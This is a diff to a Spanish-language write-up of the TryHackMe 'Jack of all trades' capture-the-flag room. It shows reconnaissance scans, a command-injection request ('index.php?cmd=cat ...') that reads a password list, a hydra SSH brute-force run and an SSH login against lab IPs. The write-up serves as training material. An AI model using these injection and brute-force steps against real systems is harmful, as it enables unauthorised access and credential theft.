@@ -61,7 +61,7 @@ ping -c 1 {ip}
 nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 ```
 
-- Utilizamos **whatweb** con la {ip} sobre los puertos 22 y 80, sobre el puerto 80 nos genera error en su lugar en el pueroto 22 nos listó la siguiente información:
+- Utilizamos **whatweb** con la {ip} sobre los puertos 22 y 80, sobre el puerto 80 nos genera error en su lugar en el puerto 22 nos listó la siguiente información:
 
 ![logo](/assets/images/thm-writeup-jack-of-all-trades/jack_whatweb.png)
 
@@ -81,7 +81,7 @@ nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 └─# wfuzz --hc=404,273 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.68.28:22//FUZZ/
 ```
 
-- Con el anterior escaner encotramos las siguientes rutas:
+- Con el anterior escaner encotramos la siguiente ruta:
   - "assets"
 
 ![assets](/assets/images/thm-writeup-jack-of-all-trades/jack_assets.png)
@@ -90,7 +90,7 @@ nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 
 ## 4. GOBUSTER
 
-- Escaneo de subdominios con esta herramienta
+- Escaneo de subdominios con esta herramienta:
 
 ```css
 └─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.68.28:22 -x txt,py,php,js
@@ -143,6 +143,16 @@ nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 
 ## 7. Hydra
 
+- Después de realizar varias conslutas me encontre con una información interasante en la ruta **home**, se teata de un listado de passwords, los cuales procedemos a listar desde burpsuite con la siguiente petición desde el **repeater** y obtenemos un listado:
+
+```css
+GET /nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list HTTP/1.1
+```
+
+![burp](/assets/images/thm-writeup-jack-of-all-trades/jack_burp_list.png)
+
+- Guardamos las contraseñas en un archivo, para nuestro casp **dic.txt** y utilizando **hydra** procedemos mediante fuerza bruta a encontrar las credenciales para el usuario **jack** con el siguiente comando:
+  
 ```css
 ┌──(root㉿bogsec)-[/home/ocortesl/THM/Jack/exploit]
 └─# hydra -l jack -P dic.txt -s 80 ssh://10.10.68.28 
@@ -152,12 +162,28 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-04 20:15:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
 [DATA] attacking ssh://10.10.68.28:80/
-[80][ssh] host: 10.10.68.28   login: jack   password: ITMJpGGIqg1jn?>@
+[80][ssh] host: 10.10.68.28   login: jack   password: ????????????
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-04 20:15:23
 ```
 
 ## 8. Bandera usuario
+
+- Con la contraseña encontrada en el punto anterior, ingresamos mediante **ssh** por el puerto **80** y al listar el contenido nos encontramos con el archivo **user.jpg**
+
+```css
+┌──(root㉿bogsec)-[/home/ocortesl/THM/Jack]
+└─# ssh -p 80 jack@10.10.38.231
+The authenticity of host '[10.10.38.231]:80 ([10.10.38.231]:80)' can't be established.
+ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:40: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.38.231]:80' (ED25519) to the list of known hosts.
+jack@10.10.38.231's password
+jack@jack-of-all-trades:/tmp$ ls
+user.jpg
+```
 
 - Compartimos un servidor por el puerto **8080** y accedemos a la dirección desde el navegador y observamos el **index** y en este el archivo **user.jpg**, como se observa a continuación:
   
